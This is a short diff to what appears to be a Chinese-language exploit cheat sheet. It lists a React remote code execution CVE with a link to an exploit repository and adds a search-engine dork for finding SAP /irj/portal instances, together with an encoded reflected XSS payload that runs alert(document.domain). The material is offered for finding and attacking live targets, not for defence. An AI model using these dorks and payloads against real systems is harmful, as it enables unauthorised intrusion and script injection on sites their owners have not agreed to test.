@@ -5,3 +5,8 @@ react
 ----------------------------------------
 + CVE-2025-66478  react框架远程代码执行漏洞
     - https://github.com/hackersatyamrastogi/react2shell-ultimate
+
+/irj/portal
+----------------------------------------
++ 特征： ``inurl:"/irj/portal/"``
++ 替换为Payload: ``/SAPIrExtHelp/random/"><SVG ONLOAD%3d%26%2397%26%23108%26%23101%26%23114%26%23116(%26%23x64%26%23x6f%26%23x63%26%23x75%26%23x6d%26%23x65%26%23x6e%26%23x74%26%23x2e%26%23x64%26%23x6f%26%23x6d%26%23x61%26%23x69%26%23x6e)>.asp``
